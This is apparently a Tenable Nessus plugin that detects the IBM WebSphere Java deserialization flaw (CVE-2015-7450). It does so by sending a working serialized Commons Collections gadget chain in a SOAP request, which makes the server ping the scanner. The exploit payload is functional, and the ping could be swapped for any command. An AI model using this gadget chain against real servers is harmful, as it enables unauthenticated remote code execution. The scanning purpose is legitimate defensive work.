#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(87171);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2017/03/15 20:36:15 $");

  script_cve_id("CVE-2015-7450");
  script_bugtraq_id(77653);
  script_osvdb_id(129952, 130289, 130424);
  script_xref(name:"CERT", value:"576313");

  script_name(english:"IBM WebSphere Java Object Deserialization RCE");
  script_summary(english:"Attempts to execute a command on the remote host via a crafted SOAP request.");

  script_set_attribute(attribute:"synopsis", value:
"The remote WebSphere Application Server is affected by a remote code
execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote IBM WebSphere Application Server is affected by a remote
code execution vulnerability due to unsafe deserialize calls of
unauthenticated Java objects to the Apache Commons Collections (ACC)
library. An unauthenticated, remote attacker can exploit this, by
sending a crafted SOAP request, to execute arbitrary code on the
target host.");
  script_set_attribute(attribute:"see_also", value:"http://www-01.ibm.com/support/docview.wss?uid=swg21970575");
  # http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0204f30");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate interim fix per the vendor advisory.
Alternatively, ensure that all exposed ports used by the WebSphere
Application Server are firewalled from any public networks.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'IBM WebSphere RCE Java Deserialization Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/11/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/12/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");

  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:websphere_application_server");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:http_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2015-2017 Tenable Network Security, Inc.");

  script_dependencies("websphere_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 8880);
  script_require_keys("www/WebSphere");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("string.inc");
include("http.inc");

appname = "WebSphere";
os = get_kb_item_or_exit("Host/OS");
port = get_http_port(default:8880, embedded:FALSE);
get_kb_item_or_exit("www/WebSphere/" + port + "/installed");

ping_cmd = '';
id_tag = hexstr(rand_str(length:10));
if("windows" >< tolower(os)) ping_cmd = "ping -n 10 ";
else ping_cmd = "ping -c 10 -p " + string(id_tag) + " ";
ping_cmd += this_host();

#
# open connection to WebSphere.
#
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL,port,appname);

#
# build SOAP request with arbitrary ping command
#
raddress = get_host_ip();
rn = raw_string(0x0d, 0x0a);

serObj = hex2raw(s:"ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400");
len = strlen(ping_cmd);
serObj += raw_string(len) + ping_cmd;
serObj += hex2raw(s:"740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A");

serObjB64 = base64(str:serObj);

ser1 = "rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/////dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv////50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/////nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4";
ser2 = "rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==";
ser3 = "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgAkY29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5TZXNzaW9uJ5mLeyYSGOUCAANKAAJpZFoADnNoYXJlV29ya3NwYWNlTAAIdXNlck5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAAVEDKkaUAXQAEVNjcmlwdDE1MTAzMmE0Njk0";
ser4 = "rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=";

xmlObj = "<?xml version='1.0' encoding='UTF-8'?>" + rn +
'<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">' + rn +
'<SOAP-ENV:Header ns0:JMXConnectorContext="'+ser1+'" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">' + rn +
'</SOAP-ENV:Header>' + rn +
'<SOAP-ENV:Body>' + rn +
'<ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">' + rn +
'<objectname xsi:type="ns1:javax.management.ObjectName">'+ser2+'</objectname>' + rn +
'<operationname xsi:type="xsd:string">getUnsavedChanges</operationname>' + rn +
'<params xsi:type="ns1:[Ljava.lang.Object;">'+serObjB64+'</params>' + rn +
'<signature xsi:type="ns1:[Ljava.lang.String;">'+ser4+'</signature>' + rn +
'</ns1:invoke>' + rn +
'</SOAP-ENV:Body>' + rn +
'</SOAP-ENV:Envelope>';

contentLen = strlen(xmlObj);

data = "POST / HTTP/1.0" + rn +
"Host: "+ raddress +":"+ string(port) + rn +
"Content-Type: text/xml; charset=utf-8" + rn +
"Content-Length: " + string(contentLen) + rn +
'SOAPAction: "urn:AdminService"' + rn + rn +
xmlObj;

filter = "icmp and icmp[0] = 8 and src host " + get_host_ip();
response = send_capture(socket:soc, data:data, pcap_filter:filter);
icmp = tolower(hexstr(get_icmp_element(icmp:response, element:"data")));
close(soc);

# No response, meaning we didn't get in
if(isnull(icmp) || ("windows" >!< tolower(os) && id_tag >!< icmp)) audit(AUDIT_LISTEN_NOT_VULN, appname, port);

if (report_verbosity > 0)
{
  report =
    '\nNessus was able to exploit a Java deserialization vulnerability by' +
    '\nsending a crafted Java object.' +
    '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port:port);